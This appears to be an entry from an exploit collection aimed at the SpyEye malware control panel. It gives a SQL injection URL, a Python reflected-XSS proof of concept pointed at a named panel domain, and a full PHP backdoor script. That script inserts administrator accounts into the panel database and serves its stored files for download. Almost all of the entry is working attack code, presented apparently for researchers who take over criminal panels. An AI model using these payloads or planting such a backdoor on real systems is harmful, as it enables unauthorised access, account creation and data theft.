#### Spy-Eye

Type: SQLi
```
http://localhost/frm_boa-grabber_sub.php?dt=11%2F11%2F1998
```
<br>
Type:  frmcp2 XSS

Author: [Xylitol](https://twitter.com/Xylit0l)
```
# SpyEye version ? reflected XSS POC
# Xartrick
# Xylitol

import urllib
import urllib2

# Configuration ...

sPayload  = '<script>alert(1);</script>'
sPanel    = 'http://drookinabra.ru/adm/frmcp2/'
sURL      = sPanel + 'mod_savecert.php?id=' + sPayload

# Exploitation

sPOST     = {'host' : sPayload}
sData     = urllib.urlencode(sPOST)
oURL      = urllib2.Request(sURL, sData)
oResponse = urllib2.urlopen(oURL)
sPage     = oResponse.read()

if (sPayload in sPage):
    print("Exploitation works, the vulnerabily exists!")
else:
    print("You are a bad hacker!")
    ```
Type:  Backdoor

Author: [Xylitol](https://twitter.com/Xylit0l)
```
    <?php
    // Xyl2k :þ
    // Thanks to EsSandre for the additional help.

        $MySQLI = array();

        /* MySQLI ID */

        $MySQLI['HOST'] = 'localhost';
        $MySQLI['USER'] = 'root';
        $MySQLI['PASS'] = 'toor';
        $MySQLI['DB'] = 'maincp';

        function str_error($error)
        {
            print '<p style="color:red;">'.htmlentities($error).'</p>';
        }

        function download_binary($path_file, $buf)
        {
            header("Pragma: public");
            header("Expires: 0");
            header("Cache-Control: must-revalidate, post-check=0, pre-check=0");
            header("Cache-Control: private", false);
            header("Content-Type: application/octet-stream");
            header("Content-Disposition: attachment; filename=\"".basename($path_file)."\";" );

            header("Content-Transfer-Encoding: binary");
            header("Content-Length: ".strlen($buf));

            echo $buf;
        }

        $mysqli = new mysqli($MySQLI['HOST'], $MySQLI['USER'], $MySQLI['PASS'], $MySQLI['DB']);

       if (isset($_POST['register_submit']))
        {
            unset($_GET['id']);
            if (isset($_POST['user']) && !is_array($_POST['user']) && !empty($_POST['user']))
            {
                if (isset($_POST['password']) && !is_array($_POST['password']) && !empty($_POST['password']))
                {
                    if (trim($_POST['user']) == '' || trim($_POST['password']) == '')
                        str_error('An error has occurred');
                    else
                    {
                        $user = mysql_real_escape_string($_POST['user']);
                        $password = md5($_POST['password']);
                        $mysqli->query("INSERT INTO users_t VALUES('', '".$user."', '".$password."', '', '')");
                        echo '<p style="color:green;">User added successfully</p>';
                    }
                }
                else
                    str_error('An error has occurred');
            }
            else
                str_error('An error has occurred');
        }

        if (mysqli_connect_errno())
            die(str_error('MySQLI Connect : '.mysqli_connect_error()));

        if (isset($_GET['id']) && !empty($_GET['id']) && !is_array($_GET['id']))
        {
            if (is_numeric($_GET['id']) && $_GET['id'] > 0)
            {
                $id = $_GET['id'];
                $sql = $mysqli->query('SELECT fName, fCont FROM files_t WHERE fId=\''.$id.'\'');
                if ($sql->num_rows)
                {
                    $_sql = $sql->fetch_array(MYSQLI_ASSOC);
                    download_binary($_sql['fName'], $_sql['fCont']);
                }
                else
                    str_error('Invalid file');
            }
            else
                str_error('Invalid file');
        }
        else
        {
            echo '<h3>Add an Admin Account</h3><br />
                <form action="'.basename($_SERVER['PHP_SELF']).'" method="POST">
                <label for="user">Username</label><br /><input name="user" type="text"/><br /><br />
                <label for="user">Password</label><br /><input name="password" type="password"/><br /><br />
                <input name="register_submit" value="Register" type="submit"/>
                </form>';

            $sql = $mysqli->query('SELECT fId, fName, fCont FROM files_t');
            if (!$sql)
                die(str_error('MySQLI :: Query error : '.$mysqli->error));

            echo "\n<h3>List of available file in database</h3><br />\n";

            while($row = $sql->fetch_array(MYSQLI_ASSOC))
            {
                echo "<a href=\"".basename($_SERVER['PHP_SELF'])."?id=".$row['fId']."\">".htmlentities($row['fName'])."</a><br /><br />\n";
            }
        }
        mysqli_close($mysqli);
    ?>
```
